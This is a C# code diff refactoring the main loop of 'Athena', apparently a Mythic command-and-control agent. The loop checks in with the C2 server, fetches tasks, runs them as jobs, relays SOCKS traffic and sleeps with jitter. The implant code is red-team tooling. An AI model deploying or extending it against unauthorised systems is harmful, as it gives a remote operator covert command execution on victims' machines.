@@ -4,7 +4,6 @@ using System.Collections.Generic;
 using System.Threading;
 using System.Threading.Tasks;
 using System;
-using System.Linq;
 using Athena.Models.Mythic.Checkin;
 using Athena.Models.Mythic.Tasks;
 using Athena.Models.Mythic.Response;
@@ -61,17 +60,20 @@ namespace Athena
             //We checked in successfully, reset to 0
             missedCheckins = 0;
 
-            CommandHandler cmdHandler = new CommandHandler();
-
             //Main Loop
             while (!(missedCheckins == maxMissedCheckins) & !exit)
             {
                 try
                 {
-                    //List<MythicJob> hasoutput = Globals.jobs.Values.Where(c => c.hasoutput).ToList();
-                    List<DelegateMessage> delegateMessages = Globals.mc.MythicConfig.forwarder.GetMessages();
-                    List<SocksMessage> socksMessages = Globals.socksHandler.GetMessages();
-                    List<object> responses = await cmdHandler.GetResponses();
+                    var delegateTask = Globals.mc.MythicConfig.forwarder.GetMessages();
+                    var socksTask = Globals.socksHandler.GetMessages();
+                    var responsesTask = Globals.mc.commandHandler.GetResponses();
+
+                    await Task.WhenAll(delegateTask, socksTask, responsesTask);
+
+                    List<DelegateMessage> delegateMessages = delegateTask.Result;
+                    List<SocksMessage> socksMessages = socksTask.Result;
+                    List<object> responses = responsesTask.Result;
 
 
                     List<MythicTask> tasks = await Globals.mc.GetTasks(responses, delegateMessages, socksMessages);
@@ -84,7 +86,7 @@ namespace Athena
                         }
 
                         //Return responses to waiting queue
-                        await cmdHandler.AddResponse(responses);
+                        await Globals.mc.commandHandler.AddResponse(responses);
 
                         missedCheckins++;
                     }
@@ -92,7 +94,7 @@ namespace Athena
                     {
                         Parallel.ForEach(tasks, async c =>
                         {
-                            await cmdHandler.StartJob(c);
+                            await Globals.mc.commandHandler.StartJob(c);
                         });
 
                     }
@@ -105,7 +107,7 @@ namespace Athena
                         Environment.Exit(0);
                     }
                 }
-                await Task.Delay(Misc.GetSleep(Globals.mc.MythicConfig.sleep, Globals.mc.MythicConfig.jitter) * 1000);
+                await Task.Delay(await Misc.GetSleep(Globals.mc.MythicConfig.sleep, Globals.mc.MythicConfig.jitter) * 1000);
             }
         }
 
@@ -140,7 +142,7 @@ namespace Athena
                 {
                 }
                 //Sleep before attempting checkin again
-                Thread.Sleep(Misc.GetSleep(Globals.mc.MythicConfig.sleep, Globals.mc.MythicConfig.jitter) * 1000);
+                Thread.Sleep(await Misc.GetSleep(Globals.mc.MythicConfig.sleep, Globals.mc.MythicConfig.jitter) * 1000);
             }
             return res;
         }
